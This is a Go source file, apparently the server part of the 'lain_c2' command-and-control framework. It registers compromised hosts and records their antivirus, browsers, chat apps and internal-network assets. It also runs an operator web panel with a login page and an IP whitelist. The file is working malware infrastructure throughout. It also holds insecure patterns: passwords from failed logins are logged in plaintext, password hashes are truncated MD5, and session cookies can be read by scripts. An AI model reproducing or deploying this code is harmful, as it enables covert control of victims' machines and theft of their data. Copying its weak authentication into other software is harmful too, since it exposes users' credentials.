	HostKey     string `json:"host_key"`
	ShellIP     string `json:"shell_ip"`
	Uid         string `json:"uid"`
}
type Data_conn struct {
	Conns []getConn `json:"conns"`
}
var data_conn Data_conn

//内网资产结构体
type Innet struct {
    Uid    string   `json:"Uid"`
    IP           string   `json:"ip"`
    Target       string   `json:"target"`
    ShellInnet   []string `json:"shell_innet"`
}

type DataInnet struct {
    Innets []Innet `json:"innets"`
}
var data_innet DataInnet

func put_innet(uid, target string, shell_innet []string) {
    var IP string
    for _, client := range client_data.Clients {
        if uid == client.Uid {
            IP = client.ExternalIP
            break
        }
    }
    // 查找是否已有匹配的 Innet
    found := false
    for i := range data_innet.Innets {
        if uid == data_innet.Innets[i].Uid && target == data_innet.Innets[i].Target {
            found = true
            for _, v := range shell_innet { // 遍历新传入的 shell_innet 列表
                replaced := false
                for index, existing := range data_innet.Innets[i].ShellInnet {
                    if strings.HasPrefix(existing, v) {
                        // 直接修改原始数据
                        data_innet.Innets[i].ShellInnet[index] = v
                        replaced = true
                        break
                    }
                }
                // 如果没有找到以 v 开头的项，则追加
                if !replaced {
                    data_innet.Innets[i].ShellInnet = append(data_innet.Innets[i].ShellInnet, v)
                }
            }
            return
        }
    }
    // 如果没有找到，追加新的 Innet
    if !found {
        newInnet := Innet{
            Uid:        uid,
            IP:         IP,
            Target:     target,
            ShellInnet: shell_innet, // 直接赋值传入的 shell_innet 列表
        }
        data_innet.Innets = append(data_innet.Innets, newInnet)
    }
}


// 辅助函数：检查切片中是否包含某个字符串
func contains(slice []string, item string) bool {
    for _, v := range slice {
        if v == item {
            return true
        }
    }
    return false
}

//写入链接结构体
func put_conn(username, host, online_time,uid,shell_ip,host_key string){
	newConn := getConn{
        Username:   username,
        Host:       host,
        OnlineTime: online_time,
		HostKey:    host_key,
        ShellIP:    shell_ip,
		Uid:		uid,
    }
	for _,conn := range data_conn.Conns{
		if username == conn.Username && uid == conn.Uid{
			return
		}
	}
    data_conn.Conns = append(data_conn.Conns, newConn)
	log_str := fmt.Sprintf(log_word["request_host"],username, shell_ip, host, uid)
	logger.WriteLog(log_str)
}

type MyServer struct{}
func (s *MyServer) PutServer(
    port, path, connPath, msgPath,switch_key,encry_key,download,result,net,info,
    upload,list,option,protocol, username, remark string,
    certPEM, keyPEM,uid,hostname,keyPart,filekey,windows_pro,base_rounds string, clients int,
) bool {
    // 检查是否已有相同的服务器配置（端口和协议相同）
    for _, server := range server_data.Servers {
        if server.Port == port && server.Protocol == protocol {
            log.Printf("Server with port %v and protocol %v already exists.\n", port, protocol)
            return false
        }
    }
    if remark == "" {
        remark = port + protocol
    }
    newServer := Server{
        Port:     port,
        Path:     path,
        ConnPath: connPath,
        MsgPath:  msgPath,
        SwitchPath: switch_key,
        EncryPath: encry_key,
        DownloadPath: download,
        ResultPath: result,
        NetPath: net,
        InfoPath: info,
        UploadPath: upload,
        ListPath: list,
        OptionPath: option,
        Protocol: protocol,
        CertPath: certPEM,
        KeyPath:  keyPEM,
        Clients:  clients,
        User: username,
        Remark:   remark,
        Uid:     uid,
        Hostname: hostname,
        KeyPart:  keyPart,
        Filekey:  filekey,
        WindowsPro: windows_pro,
        BaseRounds: base_rounds,
    }
    server_data.Servers = append(server_data.Servers, newServer)
    return true
}
// Windows 专属的写入主机结构体函数
func Windows_put_client(username, host, osType, online_time, shell_ip, currentDir, version, innet_ip, remarks, uid, server_remark, executable string, _delay, jitter int, macs, cpuInfo, antivirus, browsers, chatApps, memoryStr, systemType, arch string) {
    newClient := WindowsClient{
        Username:     username,
        Host:         host,
        OS:           osType,
        Delay:        _delay,
        OnlineTime:   online_time,
        ExternalIP:   shell_ip,
        LocalIP:      innet_ip,
        CurrentDir:   currentDir,
        Version:      version,
        Remarks:      remarks,
        Uid:          uid,
        Server:       server_remark,
        Jitter:       jitter,
        Executable:   executable,
        // Windows 专属字段
        MacAddresses: macs,
        CPUInfo:      cpuInfo,
        Antivirus:    antivirus,
        Browsers:     browsers,
        ChatApps:     chatApps,
        MemoryInfo:   memoryStr,
        SystemType:   systemType,
        Architecture: arch,
    }
    // 检查是否已存在相同的客户端，如果存在则更新
    for i, client := range windows_client_data.Clients {
        if username == client.Username && host == client.Host && uid == client.Uid {
            windows_client_data.Clients[i].OnlineTime = online_time
            windows_client_data.Clients[i].ExternalIP = shell_ip
            windows_client_data.Clients[i].LocalIP = innet_ip
            windows_client_data.Clients[i].Delay = _delay
            windows_client_data.Clients[i].CurrentDir = currentDir
            windows_client_data.Clients[i].Version = version
            windows_client_data.Clients[i].Remarks = remarks
            windows_client_data.Clients[i].CheckTime = online_time
            windows_client_data.Clients[i].Server = server_remark
            windows_client_data.Clients[i].Jitter = jitter
            windows_client_data.Clients[i].Executable = executable
            // 更新 Windows 专属字段
            windows_client_data.Clients[i].MacAddresses = macs
            windows_client_data.Clients[i].CPUInfo = cpuInfo
            windows_client_data.Clients[i].Antivirus = antivirus
            windows_client_data.Clients[i].Browsers = browsers
            windows_client_data.Clients[i].ChatApps = chatApps
            windows_client_data.Clients[i].MemoryInfo = memoryStr
            windows_client_data.Clients[i].SystemType = systemType
            windows_client_data.Clients[i].Architecture = arch
            return
        }
    }
    
    // 如果不存在，则添加新客户端
    windows_client_data.Clients = append(windows_client_data.Clients, newClient)
}
// 写入主机结构体
func put_client(username, host, osType, online_time, shell_ip,currentDir,version,innet_ip,Remarks,uid,server_remark,executable string, _delay,jitter int) {
    newClient := Client{
        Username:   username,
        Host:       host,
        OS:         osType,
        Delay:       _delay,
        OnlineTime: online_time,
        ExternalIP:    shell_ip,
		LocalIP:    innet_ip,
		CurrentDir: currentDir,
		version:    version,
		Remarks:    Remarks,
		Uid:         uid,
        Server: server_remark,
        Jitter:     jitter,
        Executable: executable,
    }
	for i,client := range client_data.Clients{
		if username == client.Username && host == client.Host && uid == client.Uid{
			client_data.Clients[i].OnlineTime = online_time
			client_data.Clients[i].ExternalIP = shell_ip
			client_data.Clients[i].LocalIP = innet_ip
			client_data.Clients[i].Delay = _delay
			client_data.Clients[i].CurrentDir = currentDir
			client_data.Clients[i].version = version
			client_data.Clients[i].Remarks = Remarks
			client_data.Clients[i].checkTime = online_time
            client_data.Clients[i].Server = server_remark
            client_data.Clients[i].Jitter = jitter
            client_data.Clients[i].Executable = executable
			return
		}
	}
    client_data.Clients = append(client_data.Clients, newClient)
}
//读取结构体
func readJSONFile(fileName string, v interface{}) error {
    file, err := os.OpenFile(fileName, os.O_RDWR|os.O_CREATE, 0644)
    if err != nil {
        return fmt.Errorf("could not open file: %v", err)
    }
    defer file.Close()
    byteValue, err := ioutil.ReadAll(file)
    if err != nil {
        return fmt.Errorf("Failed to read file content: %v", err)
    }
    if len(byteValue) > 0 {
        err = json.Unmarshal(byteValue, v)
        if err != nil {
            return fmt.Errorf("Failed to parse JSON data: %v", err)
        }
    }
    return nil
}

/*结构体数据部分结束*/

func main(){
    Read_log_word()
    asciiArt := 
    `
                                ..                    .
                                x .d88"                @88>
                                5888R                 %8P      u.    u.
                                '888R         u        .     x@88k u@88c.
                                888R      us888u.   .@88u  ^"8888""8888"
                                888R   .@88 "8888" ''888E   8888  888R
                                888R   9888  9888    888E    8888  888R
                                888R   9888  9888    888E    8888  888R
                                888R   9888  9888    888E    8888  888R
                                .888B . 9888  9888    888&   "*88*" 8888"
                                ^*888%  "888*""888"   R888"    ""   'Y"            .....  ...₵Ø₦₦Ɇ₵₮ ɆVɆⱤ₮Ⱨł₦₲...  ....
                                "%     ^Y"   ^Y'     ""     
    source code from: https://github.com/Mazzy-Stars/lain_c2
    `
    // 查询用户结构体
    user_err := readJSONFile("user.json", &data_user)
    if user_err != nil {
        fmt.Println("Failed to read user data")
    }
    var index_port string
    var certPath string
    var keyPath string
    var useDefaultCert bool
    var css_file string
    var switch_http bool
    var ui_route string
    var web_route string

    var web_js string
    var web_css string

    // 读取命令行参数
    flag.StringVar(&index_port, "p", "443", "Port")
    flag.StringVar(&certPath, "cert", "", "Customize public key path")
    flag.StringVar(&keyPath, "key", "", "Customize private key path")
    flag.BoolVar(&useDefaultCert, "DefaultCert", false, "Use default public and private keys")
    flag.StringVar(&error_str, "resp-error", "404 page not found", "web error resp")
    flag.StringVar(&css_file, "css","", "Use default css file")
    flag.StringVar(&web_title, "title","connect", "web ui title")
    flag.BoolVar(&switch_http, "http", false, "Use HTTP instead of HTTPS")
    flag.StringVar(&ui_route, "ui-route", "server", "web ui route")
    flag.StringVar(&web_route, "web-route", "user_index", "backend communication routing")

    flag.StringVar(&web_js, "js-route", "lain.js", "customize web js")
    flag.StringVar(&web_css, "css-route", "lain.css", "customize web css")

    flag.Parse()
    if _, err := os.Stat("./html"); os.IsNotExist(err) {
        err := os.MkdirAll("./html", os.ModePerm)
        if err != nil {
            fmt.Println("[*] Unable to create directory ./html:", err)
            return
        }
        fmt.Println("[*] directory ./html Created successfully")
    }
    fs := http.FileServer(http.Dir("./html"))
    http.Handle("/", fs)
    fmt.Println(asciiArt)

    //登录
    http.Handle("/login", login(ui_route,web_css))

    //页面
    http.HandleFunc("/"+ui_route, func(w http.ResponseWriter, r *http.Request) {
        web_ui.Lain(error_str,web_title,web_js,web_css,web_route,sessionSlice).ServeHTTP(w, r)
    })

    //有权限交互
    http.Handle("/"+web_route, withCORS(User_index(web_route)))

    //调用js
    http.HandleFunc("/"+web_js, func(w http.ResponseWriter, r *http.Request) {
        web_ui.Js(error_str,web_route,web_js,web_css,sessionSlice).ServeHTTP(w, r)
    })

    //调用css
    http.HandleFunc("/"+web_css, func(w http.ResponseWriter, r *http.Request) {
        web_ui.Css(css_file,error_str).ServeHTTP(w, r)
    })

    // 创建 HTTP Server
    server := &http.Server{
        Addr:         ":" + index_port,
        Handler:      http.DefaultServeMux,
        IdleTimeout:  0,
        ReadTimeout:  30 * time.Second,
        WriteTimeout: 30 * time.Second,
    }

    if switch_http {
        // 使用 HTTP
        fmt.Printf("[*] Start HTTP server successful, access address http://localhost:%s/login\n", index_port)
        err := server.ListenAndServe()
        if err != nil {
            fmt.Printf("FAIL TO START HTTP SERVER %v\n", err)
        }
    } else {
        // 使用 HTTPS
        var cert tls.Certificate
        var err error
        if useDefaultCert || (certPath == "" && keyPath == "") {
            cert, err = tls.X509KeyPair([]byte(protocol.DefaultCert), []byte(protocol.DefaultKey))
            if err != nil {
                fmt.Printf("Failed to load default certificate: %v\n", err)
                return
            }
        } else if certPath != "" && keyPath != "" {
            cert, err = tls.LoadX509KeyPair(certPath, keyPath)
            if err != nil {
                fmt.Printf("[*] Failed to load custom certificate: %v\n", err)
                return
            }
        } else {
            flag.Usage()
            return
        }
        // 自定义 TLS 配置
        tlsConfig := &tls.Config{
            MinVersion:       tls.VersionTLS12,
            GetCertificate:   func(chi *tls.ClientHelloInfo) (*tls.Certificate, error) { return &cert, nil },
            ClientAuth:       tls.NoClientCert,
            InsecureSkipVerify: true,
        }
        server.TLSConfig = tlsConfig
        fmt.Printf("[*] Start HTTPS server successful, access address https://localhost:%s/login\n", index_port)
        err = server.ListenAndServeTLS("", "")
        if err != nil {
            fmt.Printf("FAIL TO START HTTPS SERVER %v\n", err)
        }
    }
}
// 新增包装器
func withCORS(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        whitelist, err := readWhitelist()
        if err != nil {
            w.WriteHeader(http.StatusNotFound)
            http.Error(w, error_str, http.StatusInternalServerError)
            return
        }
        ip, _, err := net.SplitHostPort(r.RemoteAddr)
        if err != nil {
            ip = r.RemoteAddr // 兜底
        }
        allowed := false
        for _, wip := range whitelist {
            // fmt.Println("Client IP:", ip, "Whitelist IP:", wip)
            if ip == wip {
                allowed = true
                break
            }
        }
        if !allowed {
            w.WriteHeader(http.StatusNotFound)
            http.Error(w, error_str, http.StatusForbidden)
            return
        }
        next.ServeHTTP(w, r)
    })
}
func Read_log_word() {
    filePath := "word.json"
    // 默认内容（英文版）
    defaultContent := 
    `
    {
        "removed_agent": "Client [%s] has been removed",
        "stop_server": "There are implants on the listening server, cannot stop service",
        "removed_server": "Listening server [%s] has been removed",
        "no_found_server": "Listening server %s not found",
        "plugin_code": "Plugin code: %s, code: %s",
        "agent_online": "==== New client online ==== | User: %v | UID: %v | Host: %v | OS: %v | Shell Version: %v | Executable: %v | Delay: %v sec | Jitter: %v sec | Server IP: %v | Internal IP: %v | Port: %v | Protocol: %v | Server Remark: %v | Current Path: %v | Key Hash (partial): %v ====",
        "windows_agent_online": "==== New Windows client online | User: %v | UID: %v | Host: %v | OS: %v | Shell Version: %v | Executable: %v | Delay: %v sec | Jitter: %v sec | Server IP: %v | Internal IP: %v | Port: %v | Protocol: %v | Server Remark: %v | Current Path: %v | Key Hash (partial): %v | MAC: %v | CPU: %v | Memory: %v | System: %v | Arch: %v | Antivirus: %v | Browser: %v | Chat Software: %v ====",
        "change_file_time": "%v Changed file time: %s",
        "change_file_name": "%v Changed file name: %s",
        "result": "Host: %s [%s] received bytes: [*%d...]",
        "msg": "Send host %v message %v, %v",
        "scan_msg": "%v Scan host %s",
        "scan_result": "Host %s && %s received internal assets: [*%d...]",
        "download": "Host: [%s] file downloaded successfully: [%s]",
        "download_part": "Host: [%s] downloading file: [%s], length: %v, part: %v",
        "request_file": "Received a file upload request",
        "request_file_part": "Received file part: %s, size: %dMB",
        "request_file_part_": " ==== Received from user: %s, UID: %s, file: %s, part: %v, range: %d-%d",
        "web_upload": "%v key does not exist",
        "tmp_file": "%v failed to create temp file: %v",
        "write_tmp": "%v failed to write temp file: %v",
        "read_tmp": "%v failed to read temp file: %v",
        "encry_tmp_fail": "%v file encryption failed: %v",
        "encry_tmp": "%v file encrypted successfully (%d bytes): %v",
        "Memory_clean": "Memory cleaned successfully!",
        "request_host": "User request: Username: %v, IP: %v, Host: %v, UID: %v",
        "login_success": "User login successful, from %v, user: %v",
        "login_fail": "User login failed, from %v, wrong username or password, user: %v, password: %v",
        "http_server":"[*] Start HTTP server successful, access address :%s%s,Listeners_path:%s,Msg_path:%s,switch_path:%s,key_path:%s,download_path:%s,result_path:%s,net_path:%s,info_path:%s,upload_path:%s,list_path:%s,option:%s",
        "https_server":"[*] Start HTTPS server successful, access address :%s%s,Listeners_path:%s,Msg_path:%s,switch_path:%s,key_path:%s,download_path:%s,result_path:%s,net_path:%s,info_path:%s,upload_path:%s,list_path:%s,option:%s",
        "http_err":"FAIL TO START HTTP SERVER: %v",
        "https_err":"FAIL TO START HTTPS SERVER: %v",
        "cert_err":"[*] Failed to parse provided cert or key: %v",
        "provided_cert":"[*] Using provided certificate and key",
        "default_cert":"[*] Failed to parse default cert or key: %v"
    }    
    `
    // 检查文件是否存在
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        // 文件不存在则写入默认内容
        err := os.WriteFile(filePath, []byte(defaultContent), 0644)
        if err != nil {
            fmt.Println("Failed to create word.json:", err)
            return
        }
    }
    file, err := os.Open(filePath)
    if err != nil {
        fmt.Println("无法打开 word.json:", err)
        return
    }
    defer file.Close()
    decoder := json.NewDecoder(file)
    err = decoder.Decode(&log_word)
    if err != nil {
        fmt.Println("解析 word.json 失败:", err)
        return
    }
}
func readWhitelist() ([]string, error) {
    filePath := "white.config"
    // 检查文件是否存在
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        // 文件不存在则创建并写入默认内容
        err := os.WriteFile(filePath, []byte("127.0.0.1\n::1\n"), 0644)
        if err != nil {
            return nil, err
        }
    }
    file, err := os.Open(filePath)
    if err != nil {
        return nil, err
    }
    defer file.Close()
    var whitelist []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        line := strings.TrimSpace(scanner.Text())
        if line != "" && !strings.HasPrefix(line, "//") {
            whitelist = append(whitelist, line)
        }
    }
    if err := scanner.Err(); err != nil {
        return nil, err
    }
    return whitelist, nil
}

func isOriginAllowed(origin string, whitelist []string) bool {
    if origin == "" {
        return false
    }
    // Extract host from origin URL
    u, err := url.Parse(origin)
    if err != nil {
        return false
    }
    host := u.Hostname()
    for _, allowed := range whitelist {
        if host == allowed || origin == allowed {
            return true
        }
    }
    return false
}
//登录
func login(ui_route,web_css string) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        if r.Method == http.MethodGet {
            html := fmt.Sprintf(`<!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>%s</title>
                <link rel="stylesheet" href="/`+web_css+`">
            </head>
            <body>
                <form class="form-in" action="/login" method="post" enctype="application/x-www-form-urlencoded">  
                    <h1>Login</h1>
                    <input type="text" name="username" id="username" placeholder="Username" required>
                    <input type="password" name="password" placeholder="password" required>
                    <button type="submit">Login</button>
                </form>
            </body>
            </html>`,web_title)
            w.Header().Set("Content-Type", "text/html")
            fmt.Fprint(w, html)
            return
        }
        if r.Method == http.MethodPost {
            // 解析表单数据
            err := r.ParseForm()
            if err != nil {
                w.WriteHeader(http.StatusNotFound)
                fmt.Fprint(w, error_str)
                return
            }
            username := r.FormValue("username")
            password := r.FormValue("password")
            userip := getClientIP(r)
            // 对用户名进行MD5加密并取前24位
            usernameHash := md5.New()
            usernameHash.Write([]byte(username))
            usernameHashBytes := usernameHash.Sum(nil)
            usernameHashString := hex.EncodeToString(usernameHashBytes)
            // 对密码进行MD5加密并取前24位
            passwordHash := md5.New()
            passwordHash.Write([]byte(password))
            passwordHashBytes := passwordHash.Sum(nil)
            passwordHashString := hex.EncodeToString(passwordHashBytes)
            user_err := readJSONFile("user.json", &data_user)
            if user_err != nil {
                w.WriteHeader(http.StatusNotFound)
                fmt.Fprint(w, error_str)
                return
            }
            var validUser bool
            for _, user := range data_user.Users {
                if usernameHashString[:24] == user.Username[:24] && passwordHashString[:24] == user.Password[:24]{
                    validUser = true
                    break
                }
            }
            if validUser {
                // 生成随机 Session 并绑定用户名
                randomValue := generateRandomString(32)
                cookie_value := randomValue + "=" + username
                cookie := http.Cookie{
                    Name:     "cookie",
                    Value:    cookie_value,
                    Path:     "/",
                    Expires:  time.Now().Add(6 * 30 * 24 * time.Hour), // 半年
                    Secure:   true, // ✅ 必须设置为 false 才能跨域带 cookie
                    HttpOnly: false, // ✅ 必须，要求 JavaScript 可访问
                    SameSite: http.SameSiteNoneMode, // ✅ 必须设置为 None 才能跨域带 cookie
                }
                found := false
                for _, session := range sessionSlice {
                    if session == cookie_value {
                        found = true
                        break
                    }
                }
                // 如果不存在才添加
                if !found {
                    sessionSlice = append(sessionSlice, cookie_value)
                }
                log_str := fmt.Sprintf(log_word["login_success"], userip, username)
                logger.WriteLog(log_str)
                http.SetCookie(w, &cookie)
                http.Redirect(w, r, "/"+ui_route, http.StatusFound)
                json.NewEncoder(w).Encode(map[string]interface{}{
                    "code": "200",
                    "message": "Login successful",
                })
            } else {
                // 没有用户则
                log_str := fmt.Sprintf(log_word["login_fail"], userip, username, password)
                logger.WriteLog(log_str)
                json.NewEncoder(w).Encode(map[string]interface{}{
                    "code": "401",
                    "message": "Unauthorized",
                })
            }
        } else {
            w.WriteHeader(http.StatusNotFound)
            fmt.Fprint(w,error_str)
        }
    }
}
func generateRandomString(length int) string {
	bytes := make([]byte, length)
	_, err := rand.Read(bytes)
	if err != nil {
		log.Fatal(err)
	}
	return hex.EncodeToString(bytes)
}